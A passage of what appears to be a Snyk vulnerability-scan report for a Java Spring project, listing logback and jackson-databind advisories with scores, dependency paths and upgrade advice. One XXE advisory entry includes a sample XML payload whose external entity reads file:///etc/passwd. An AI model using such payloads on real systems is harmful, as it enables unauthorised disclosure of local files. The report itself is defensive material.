{
  "vulnerabilities": [
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2021-09-29T13:37:34.088850Z",
      "credit": [
        "Andrei Komarov"
      ],
      "cvssScore": 4.8,
      "description": "## Overview\n[ch.qos.logback:logback-core](https://mvnrepository.com/artifact/ch.qos.logback/logback-core) is a logback-core module.\n\nAffected versions of this package are vulnerable to Insufficient Hostname Verification. `X.509` are not properly validated. By spoofing the TLS/SSL server via a certificate that appears valid, an attacker with the ability to intercept network traffic (e.g. MitM, DNS cache poisoning) can disclose and optionally manipulate transmitted data.\n## Remediation\nUpgrade `ch.qos.logback:logback-core` to version 1.2.7 or higher.\n## References\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/626c7733c188f2ad60c1348a493761f60e2d7958)\n- [GitHub PR](https://github.com/qos-ch/logback/pull/305)\n- [Jira Issue](https://jira.qos.ch/browse/LOGBACK-1574)\n",
      "disclosureTime": "2021-09-29T13:37:31Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.2.7"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-CHQOSLOGBACK-1726923",
      "identifiers": {
        "CVE": [],
        "CWE": [
          "CWE-20"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "logback-core",
        "groupId": "ch.qos.logback"
      },
      "modificationTime": "2021-11-19T16:36:31.923913Z",
      "moduleName": "ch.qos.logback:logback-core",
      "packageManager": "maven",
      "packageName": "ch.qos.logback:logback-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-10-01T14:33:15Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/qos-ch/logback/commit/626c7733c188f2ad60c1348a493761f60e2d7958"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/qos-ch/logback/pull/305"
        },
        {
          "title": "Jira Issue",
          "url": "https://jira.qos.ch/browse/LOGBACK-1574"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,1.2.7)"
        ]
      },
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Insufficient Hostname Verification",
      "severityWithCritical": "medium",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-logging@1.3.1.RELEASE",
        "ch.qos.logback:logback-classic@1.1.3",
        "ch.qos.logback:logback-core@1.1.3"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.4.13",
        "org.springframework.boot:spring-boot-starter@2.4.13",
        "org.springframework.boot:spring-boot-starter-logging@2.4.13",
        "ch.qos.logback:logback-classic@1.2.7",
        "ch.qos.logback:logback-core@1.2.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "ch.qos.logback:logback-core",
      "version": "1.1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2017-03-19T14:58:38Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[ch.qos.logback:logback-core](https://mvnrepository.com/artifact/ch.qos.logback/logback-core) is a logback-core module.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. A configuration can be turned on to allow remote logging through interfaces that accept untrusted serialized data. Authenticated attackers on the adjacent network can exploit this vulnerability to run arbitrary code through the deserialization of custom gadget chains.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `ch.qos.logback:logback-core` to version 1.1.11 or higher.\n## References\n- [GitHub Commit #1](https://github.com/qos-ch/logback/commit/f46044b805bca91efe5fd6afe52257cd02f775f8)\n- [GitHub Commit #2](https://github.com/qos-ch/logback/commit/979b042cb1f0b4c1e5869ccc8912e68c39f769f9)\n- [Logback News](https://logback.qos.ch/news.html)\n",
      "disclosureTime": "2017-03-13T06:59:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.1.11"
      ],
      "functions": [],
      "functions_new": [],
      "id": "SNYK-JAVA-CHQOSLOGBACK-30208",
      "identifiers": {
        "CVE": [
          "CVE-2017-5929"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-vmfg-rjjm-rjrj"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "logback-core",
        "groupId": "ch.qos.logback"
      },
      "modificationTime": "2021-07-06T14:08:58.642152Z",
      "moduleName": "ch.qos.logback:logback-core",
      "packageManager": "maven",
      "packageName": "ch.qos.logback:logback-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-03-21T15:30:44Z",
      "references": [
        {
          "title": "GitHub Commit #1",
          "url": "https://github.com/qos-ch/logback/commit/f46044b805bca91efe5fd6afe52257cd02f775f8"
        },
        {
          "title": "GitHub Commit #2",
          "url": "https://github.com/qos-ch/logback/commit/979b042cb1f0b4c1e5869ccc8912e68c39f769f9"
        },
        {
          "title": "Logback News",
          "url": "https://logback.qos.ch/news.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 1.1.11)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "critical",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-logging@1.3.1.RELEASE",
        "ch.qos.logback:logback-classic@1.1.3",
        "ch.qos.logback:logback-core@1.1.3"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.5.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.4.5.RELEASE",
        "org.springframework.boot:spring-boot-starter-logging@1.4.5.RELEASE",
        "ch.qos.logback:logback-classic@1.1.11",
        "ch.qos.logback:logback-core@1.1.11"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "ch.qos.logback:logback-core",
      "version": "1.1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2017-05-17T08:50:05.360000Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 9.8,
      "description": "## Overview\n[ch.qos.logback:logback-classic](https://mvnrepository.com/artifact/ch.qos.logback/logback-classic) is a reliable, generic, fast and flexible logging library for Java.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. A configuration can be turned on to allow remote logging through interfaces that accept untrusted serialized data. Authenticated attackers on the adjacent network can exploit this vulnerability to run arbitrary code through the deserialization of custom gadget chains.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `ch.qos.logback:logback-classic` to version 1.2.0 or higher.\n## References\n- [GitHub Commit #1](https://github.com/qos-ch/logback/commit/f46044b805bca91efe5fd6afe52257cd02f775f8)\n- [GitHub Commit #2](https://github.com/qos-ch/logback/commit/979b042cb1f0b4c1e5869ccc8912e68c39f769f9)\n- [Logback News](https://logback.qos.ch/news.html)\n",
      "disclosureTime": "2017-03-13T06:59:00Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "1.2.0"
      ],
      "functions": [
        {
          "functionId": {
            "className": "SocketNode",
            "filePath": "ch/qos/logback/classic/net/SocketNode.java",
            "functionName": "run"
          },
          "version": [
            "[0.3,1.2.0)"
          ]
        },
        {
          "functionId": {
            "className": "RemoteAppenderStreamClient",
            "filePath": "ch/qos/logback/classic/net/server/RemoteAppenderStreamClient.java",
            "functionName": "run"
          },
          "version": [
            "[1.0.12,1.2.0)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "ch.qos.logback.classic.net.SocketNode",
            "functionName": "run"
          },
          "version": [
            "[0.3,1.2.0)"
          ]
        },
        {
          "functionId": {
            "className": "ch.qos.logback.classic.net.server.RemoteAppenderStreamClient",
            "functionName": "run"
          },
          "version": [
            "[1.0.12,1.2.0)"
          ]
        }
      ],
      "id": "SNYK-JAVA-CHQOSLOGBACK-31407",
      "identifiers": {
        "CVE": [
          "CVE-2017-5929"
        ],
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-vmfg-rjjm-rjrj"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "logback-classic",
        "groupId": "ch.qos.logback"
      },
      "modificationTime": "2021-07-06T14:08:58.642152Z",
      "moduleName": "ch.qos.logback:logback-classic",
      "packageManager": "maven",
      "packageName": "ch.qos.logback:logback-classic",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2017-03-21T15:30:44Z",
      "references": [
        {
          "title": "GitHub Commit #1",
          "url": "https://github.com/qos-ch/logback/commit/f46044b805bca91efe5fd6afe52257cd02f775f8"
        },
        {
          "title": "GitHub Commit #2",
          "url": "https://github.com/qos-ch/logback/commit/979b042cb1f0b4c1e5869ccc8912e68c39f769f9"
        },
        {
          "title": "Logback News",
          "url": "https://logback.qos.ch/news.html"
        }
      ],
      "semver": {
        "vulnerable": [
          "[0.3,1.2.0)"
        ]
      },
      "severity": "critical",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "severityWithCritical": "critical",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter@1.3.1.RELEASE",
        "org.springframework.boot:spring-boot-starter-logging@1.3.1.RELEASE",
        "ch.qos.logback:logback-classic@1.1.3"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE",
        "org.springframework.boot:spring-boot-starter@2.0.0.RELEASE",
        "org.springframework.boot:spring-boot-starter-logging@2.0.0.RELEASE",
        "ch.qos.logback:logback-classic@1.2.3"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "ch.qos.logback:logback-classic",
      "version": "1.1.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-09-18T13:46:28.613692Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `com.pastdev.httpcomponents.configuration.JndiConfiguration`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.6 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2798)\n",
      "disclosureTime": "2020-09-18T13:44:12Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.6"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.6)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.6)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1009829",
      "identifiers": {
        "CVE": [
          "CVE-2020-24750"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-15T15:50:13.158209Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-09-18T16:19:32Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2798"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.6)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-11-29T12:43:11.601162Z",
      "credit": [
        "Srikanth Ramu",
        "threedr3am'follower"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to the class `ignite-jta`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2658)\n- [GitHub PR](https://github.com/FasterXML/jackson-databind/pull/2864#issuecomment-701026600)\n",
      "disclosureTime": "2020-09-29T22:30:33Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.4)",
            "[2.7.0,2.9.10.4)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.4)",
            "[2.7.0,2.9.10.4)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1047324",
      "identifiers": {
        "CVE": [
          "CVE-2020-10650"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2020-11-30T11:05:04.047999Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-11-29T15:58:07.317638Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2658"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/FasterXML/jackson-databind/pull/2864%23issuecomment-701026600"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L",
      "alternativeIds": [],
      "creationTime": "2020-12-04T11:58:40.054903Z",
      "credit": [
        "Bartosz Baranowski"
      ],
      "cvssScore": 8.2,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. A flaw was found in FasterXML Jackson Databind, where it does not have entity expansion secured properly in the `DOMDeserializer` class. The highest threat from this vulnerability is data integrity.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.7, 2.10.5.1 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/612f971b78c60202e9cd75a299050c8f2d724a59)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2589)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1887664)\n",
      "disclosureTime": "2020-12-04T11:54:03Z",
      "exploit": "Not Defined",
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.7",
        "2.10.5.1"
      ],
      "functions": [
        {
          "functionId": {
            "className": "DOMSerializer",
            "filePath": "com/fasterxml/jackson/databind/ext/DOMSerializer.java",
            "functionName": "<init>"
          },
          "version": [
            "[2.6.0,2.6.7.4)",
            "[2.9.0,2.9.10.7)",
            "[2.10.0, 2.10.5.1)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ext.DOMSerializer",
            "functionName": "<init>"
          },
          "version": [
            "[2.6.0,2.6.7.4)",
            "[2.9.0,2.9.10.7)",
            "[2.10.0, 2.10.5.1)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1048302",
      "identifiers": {
        "CVE": [
          "CVE-2020-25649"
        ],
        "CWE": [
          "CWE-611"
        ],
        "GHSA": [
          "GHSA-288c-cq4h-88gq"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-02-19T10:26:08.917970Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-04T15:22:52Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/612f971b78c60202e9cd75a299050c8f2d724a59"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2589"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1887664"
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.6.0,2.6.7.4)",
          "[2.9.0,2.9.10.7)",
          "[2.10.0, 2.10.5.1)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "XML External Entity (XXE) Injection",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@1.4.0.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.8.1"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-12-18T11:37:26.422837Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.dbcp2.datasources.PerUserPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade 